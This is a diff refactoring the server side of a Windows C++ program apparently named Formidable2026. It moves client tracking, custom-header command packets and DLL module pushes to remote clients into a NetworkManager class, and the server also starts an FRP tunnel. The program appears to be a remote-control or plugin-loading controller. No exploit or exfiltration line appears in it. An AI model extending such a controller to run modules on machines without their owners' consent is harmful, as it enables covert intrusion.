@@ -9,8 +9,8 @@
 #include <windows.h>
 
 #include "NetworkHelper.h"
+#include "Network/NetworkManager.h"
 #include "GlobalState.h"
-#include "StringUtils.h"
 #include "MainWindow.h"
 #include "Core/CommandHandler.h"
 #include "resource.h"
@@ -18,7 +18,6 @@
 #include <fstream>
 #include <iostream>
 #include <string>
-#include "../Common/Utils.h"
 #include "Utils/StringHelper.h"
 
 using namespace Formidable;
@@ -63,106 +62,16 @@ int GetResourceIdFromDllName(const std::wstring& dllName, bool is64Bit) {
 // HPSocket发送数据
 bool SendDataToClient(std::shared_ptr<ConnectedClient> client, const void* pData, int iLength) {
     if (!client || !client->active) return false;
-    return g_pNetworkServer->Send(client->connId, (const BYTE*)pData, iLength);
+    return Formidable::Network::NetworkManager::SendToClient(client, pData, iLength);
 }
 
 // 发送模块 DLL
 bool SendModuleToClient(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2) {
-    std::shared_ptr<ConnectedClient> client;
-    {
-        std::lock_guard<std::mutex> lock(g_ClientsMutex);
-        if (g_Clients.count(clientId)) client = g_Clients[clientId];
-    }
-    if (!client) return false;
-
-    std::vector<char> dllData;
-    
-    wchar_t szExePath[MAX_PATH];
-    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
-    std::wstring masterDir = szExePath;
-    size_t lastSlash = masterDir.find_last_of(L"\\/");
-    masterDir = masterDir.substr(0, lastSlash + 1);
-
-    std::vector<std::wstring> searchPaths;
-    bool use64Bit = (client->info.is64Bit != 0); // 使用客户端实际架构
-    
-    if (use64Bit) {
-        searchPaths.push_back(masterDir + L"x64\\" + dllName);
-        searchPaths.push_back(masterDir + L"Formidable2026\\x64\\" + dllName);
-    } else {
-        searchPaths.push_back(masterDir + L"x86\\" + dllName);
-        searchPaths.push_back(masterDir + L"Formidable2026\\x86\\" + dllName);
-    }
-    searchPaths.push_back(masterDir + dllName);
-
-    for (const auto& dllPath : searchPaths) {
-        HANDLE hFile = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD fileSize = GetFileSize(hFile, NULL);
-            if (fileSize > 0) {
-                dllData.resize(fileSize);
-                DWORD bytesRead;
-                if (ReadFile(hFile, dllData.data(), fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
-                    AddLog(L"系统", L"加载模块: " + dllName + (use64Bit ? L" (x64)" : L" (x86)"));
-                    CloseHandle(hFile);
-                    goto data_ready;
-                }
-            }
-            CloseHandle(hFile);
-        }
-    }
-
-    if (dllData.empty()) {
-        int resId = GetResourceIdFromDllName(dllName, use64Bit);
-        if (resId == 0) {
-            AddLog(L"错误", L"未找到匹配的模块资源: " + dllName);
-            return false;
-        }
-        if (!GetResourceData(resId, dllData)) {
-            AddLog(L"错误", L"加载资源失败: " + dllName);
-            return false;
-        }
-    }
-
-data_ready:
-    size_t fileSize = dllData.size();
-    size_t bodySize = sizeof(Formidable::CommandPkg) + fileSize;
-    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
-    
-    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
-    memcpy(header->flag, "FRMD26?", 7);
-    header->originLen = (int)bodySize;
-    header->totalLen = (int)buffer.size();
-    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
-    pkg->cmd = cmd;
-    pkg->arg1 = (uint32_t)fileSize;
-    pkg->arg2 = arg2;
-    memcpy(pkg->data, dllData.data(), fileSize);
-    return SendDataToClient(client, buffer.data(), (int)buffer.size());
+    return Formidable::Network::NetworkManager::SendModule(clientId, cmd, dllName, arg2);
 }
 
 bool SendSimpleCommand(uint32_t clientId, uint32_t cmd, uint32_t arg1, uint32_t arg2, const std::string& data) {
-    std::shared_ptr<Formidable::ConnectedClient> client;
-    {
-        std::lock_guard<std::mutex> lock(g_ClientsMutex);
-        if (g_Clients.count(clientId)) client = g_Clients[clientId];
-    }
-    if (!client) return false;
-    
-    size_t bodySize = sizeof(Formidable::CommandPkg) + data.size();
-    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
-    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
-    memcpy(header->flag, "FRMD26?", 7);
-    header->originLen = (int)bodySize;
-    header->totalLen = (int)buffer.size();
-    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
-    pkg->cmd = cmd;
-    pkg->arg1 = arg1;
-    pkg->arg2 = arg2;
-    if (!data.empty()) {
-        memcpy(pkg->data, data.data(), data.size());
-    }
-    return SendDataToClient(client, buffer.data(), (int)buffer.size());
+    return Formidable::Network::NetworkManager::SendCommand(clientId, cmd, arg1, arg2, data);
 }
 
 // 心跳线程
@@ -177,7 +86,7 @@ void HeartbeatThread() {
         uint64_t now = GetTickCount64();
         for (auto& pair : clientsCopy) {
             auto& client = pair.second;
-            if (client->active) {
+            if (client && client->active) {
                 // 如果超过 60 秒没有收到心跳响应，认为已断开
                 if (client->lastHeartbeat > 0 && (now - client->lastHeartbeat > 60000)) {
                     client->active = false;
@@ -196,137 +105,7 @@ void HeartbeatThread() {
 
 // 网络线程
 void NetworkThread() {
-    g_pNetworkServer = new NetworkServer();
-    
-    g_pNetworkServer->SetOnConnect([](CONNID connId, const char* ip) {
-        auto client = std::make_shared<ConnectedClient>();
-        client->connId = connId;
-        client->ip = ip;
-        // Determine port if possible or set to default
-        char szAddr[50];
-        int iLen = 50;
-        USHORT port = 0;
-        if (g_pNetworkServer->GetClientAddress(connId, szAddr, iLen, port)) {
-            client->port = port;
-        } else {
-            client->port = 0;
-        }
-
-        client->active = true;
-        
-        uint32_t clientId;
-        {
-            std::lock_guard<std::mutex> lock(g_ClientsMutex);
-            clientId = g_NextClientId++;
-            g_Clients[clientId] = client;
-            client->clientId = clientId;
-        }
-        
-        {
-            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
-            g_ConnIdToClientId[connId] = clientId;
-        }
-        
-        AddLog(L"连接", ToWString(ip) + L" 已连接");
-    });
-    
-    g_pNetworkServer->SetOnReceive([](CONNID connId, const BYTE* pData, int iLength) {
-        AddLog(L"调试", L"OnReceive: connId=" + std::to_wstring(connId) + L", len=" + std::to_wstring(iLength));
-        
-        uint32_t clientId = 0;
-        {
-            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
-            auto it = g_ConnIdToClientId.find(connId);
-            if (it != g_ConnIdToClientId.end()) {
-                clientId = it->second;
-            }
-        }
-        
-        if (clientId > 0) {
-            std::shared_ptr<ConnectedClient> client;
-            {
-                std::lock_guard<std::mutex> lock(g_ClientsMutex);
-                if (g_Clients.count(clientId)) client = g_Clients[clientId];
-            }
-            if (!client) return;
-
-            // 将收到的数据追加到缓冲区
-            client->recvBuffer.insert(client->recvBuffer.end(), pData, pData + iLength);
-
-            // 循环处理缓冲区中所有完整的包
-            while (client->recvBuffer.size() >= sizeof(Formidable::PkgHeader)) {
-                Formidable::PkgHeader* header = (Formidable::PkgHeader*)client->recvBuffer.data();
-                
-                // 验证包头标志
-                if (memcmp(header->flag, "FRMD26?", 7) != 0) {
-                    // 非法数据，清空缓冲区并断开
-                    client->recvBuffer.clear();
-                    g_pNetworkServer->Disconnect(connId);
-                    break;
-                }
-
-                int totalPkgLen = header->totalLen;
-                if (client->recvBuffer.size() >= (size_t)totalPkgLen) {
-                    // 提取包体数据
-                    const BYTE* pkgBody = client->recvBuffer.data() + sizeof(Formidable::PkgHeader);
-                    int bodyLen = header->originLen;
-
-                    // 处理包体数据
-                    Formidable::Core::CommandHandler::HandlePacket(clientId, pkgBody, bodyLen);
-
-                    // 从缓冲区移除已处理的数据
-                    client->recvBuffer.erase(client->recvBuffer.begin(), client->recvBuffer.begin() + totalPkgLen);
-                } else {
-                    // 数据包不完整，等待下一次接收
-                    break;
-                }
-            }
-        }
-    });
-    
-    g_pNetworkServer->SetOnClose([](CONNID connId) {
-        uint32_t clientId = 0;
-        {
-            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
-            auto it = g_ConnIdToClientId.find(connId);
-            if (it != g_ConnIdToClientId.end()) {
-                clientId = it->second;
-                g_ConnIdToClientId.erase(it);
-            }
-        }
-        
-        if (clientId > 0) {
-            std::shared_ptr<ConnectedClient> client;
-            {
-                std::lock_guard<std::mutex> lock(g_ClientsMutex);
-                auto it = g_Clients.find(clientId);
-                if (it != g_Clients.end()) {
-                    client = it->second;
-                    g_Clients.erase(it);
-                }
-            }
-            
-            if (client) {
-                client->active = false;
-                AddLog(L"断开", ToWString(client->ip) + L" 已断开");
-                
-                // 清理 UI
-                // if (client->listIndex >= 0) {
-                    // ListView_DeleteItem(g_hListClients, client->listIndex);
-                // }
-            }
-            
-            UpdateStatusBar();
-        }
-    });
-
-    if (!g_pNetworkServer->Start("0.0.0.0", (USHORT)g_Settings.listenPort)) {
-        AddLog(L"错误", L"网络服务启动失败，请检查端口是否被占用");
-    } else {
-        AddLog(L"系统", L"网络服务已启动，监听端口: " + std::to_wstring(g_Settings.listenPort));
-        // 启动 FRP
-        StartFrp();
-    }
+    // 此函数内容已移至 NetworkManager::Initialize
 }
 
 void StartFrp() {
